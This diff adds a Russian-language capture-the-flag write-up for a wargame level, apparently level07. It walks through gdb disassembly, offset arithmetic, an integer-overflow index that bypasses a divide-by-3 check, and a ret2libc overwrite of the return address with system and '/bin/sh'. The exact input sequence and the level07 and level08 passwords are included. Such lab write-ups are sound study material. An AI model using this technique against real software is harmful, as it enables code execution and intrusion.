@@ -1,0 +1,62 @@
+1. Логин level07:GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8
+2. В коде видно, что массив индексов, которые могут занести, ограничен до 100, но индексы ничем не ограничены кроме деления на 3
+3. Надо найти адрес массива
+```assembler
+(gdb) disas read_number
+Dump of assembler code for function read_number:
+   0x080486d7 <+0>:     push   ebp
+   0x080486d8 <+1>:     mov    ebp,esp
+   0x080486da <+3>:     sub    esp,0x28
+=> 0x080486dd <+6>:     mov    DWORD PTR [ebp-0xc],0x0
+   0x080486e4 <+13>:    mov    eax,0x8048add
+   0x080486e9 <+18>:    mov    DWORD PTR [esp],eax
+   0x080486ec <+21>:    call   0x8048470 <printf@plt>
+   0x080486f1 <+26>:    call   0x80485e7 <get_unum>
+   0x080486f6 <+31>:    mov    DWORD PTR [ebp-0xc],eax
+   0x080486f9 <+34>:    mov    eax,DWORD PTR [ebp-0xc]
+   0x080486fc <+37>:    shl    eax,0x2
+   0x080486ff <+40>:    add    eax,DWORD PTR [ebp+0x8]
+   0x08048702 <+43>:    mov    edx,DWORD PTR [eax]
+   0x08048704 <+45>:    mov    eax,0x8048b1b
+   0x08048709 <+50>:    mov    DWORD PTR [esp+0x8],edx
+   0x0804870d <+54>:    mov    edx,DWORD PTR [ebp-0xc]
+   0x08048710 <+57>:    mov    DWORD PTR [esp+0x4],edx
+   0x08048714 <+61>:    mov    DWORD PTR [esp],eax
+   0x08048717 <+64>:    call   0x8048470 <printf@plt>
+   0x0804871c <+69>:    mov    eax,0x0
+   0x08048721 <+74>:    leave
+   0x08048722 <+75>:    ret
+End of assembler dump.
+(gdb) x $ebp+0x8
+0xffffd520:     0xffffd544 
+; 0xffffd544 адрес массива
+```
+5. info frame
+eip -> адрес return pointer
+0xffffd70c
+6. Вычитаем из адреса return pointer адрес массива
+4294956812 - 4294956356 = 456 (456 / 4 = 114)
+114ый индекс -> return pointer
+Но, это число делится на 3, поэтому вводим переполненный int
+4294967295 max int
+// TODO:: why div on 4?
+(4294967295 / 4) + 114 = 1073741938
+
+Какое число туда нужно положить? Адресс info function system
+ложим в 114(1073741938) -> адрес систем 0xf7e6aed0 (4159090384)
+Ложим в 116 -> адрес "/bin/sh" 0xf7f897ec (4160264172)
+
+В итоге
+```
+store
+4159090384
+1073741938
+store
+4160264172
+116
+quit
+
+cd ..
+cat level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+```
